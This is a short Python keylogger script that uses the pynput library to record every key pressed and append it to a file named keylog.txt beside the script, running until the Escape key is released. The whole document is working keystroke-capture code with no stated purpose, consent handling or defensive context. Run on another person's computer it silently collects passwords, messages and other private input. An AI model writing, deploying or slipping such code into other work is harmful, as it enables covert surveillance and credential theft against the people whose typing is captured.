from pynput import keyboard
import os

def get_info(key):
    global path

    with open(path, 'a+') as fil:
        fil.write(key)

def logger(key):
    if key == keyboard.Key.space:
        x = ' '

    elif key == keyboard.Key.enter:
        x = '\n'
        
    else:
        x = (str(key))
        x = x[1:-1]
    get_info(x)

def release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

dirpath = os.path.dirname(__file__)
path = os.path.join(dirpath, 'keylog.txt')
with open(path, 'a+') as fil:
    fil.write('\n\n')
    
with keyboard.Listener(on_press=logger, on_release=release) as ls:
    ls.join()